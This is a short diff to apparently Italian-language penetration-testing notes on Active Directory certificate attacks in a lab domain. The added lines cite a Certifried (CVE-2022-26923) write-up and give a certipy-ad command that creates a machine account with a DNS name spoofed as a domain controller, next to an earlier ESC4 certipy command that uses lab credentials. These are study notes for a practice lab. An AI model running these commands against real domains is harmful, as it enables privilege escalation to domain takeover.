@@ -260,5 +260,9 @@ certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configu
 
 Da fare
 ### **CVE-2022-26923**
+[Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
 Crea un account con un domain user e setta un nome fake del dns come domain controller
+```bash
+certipy-ad account create -u khal.drogo@essos.local -p 'horse' -user 'certifriedpc' -pass 'certifriedpass' -dns 'meereen.essos.local'
+```
 ### **titolo**
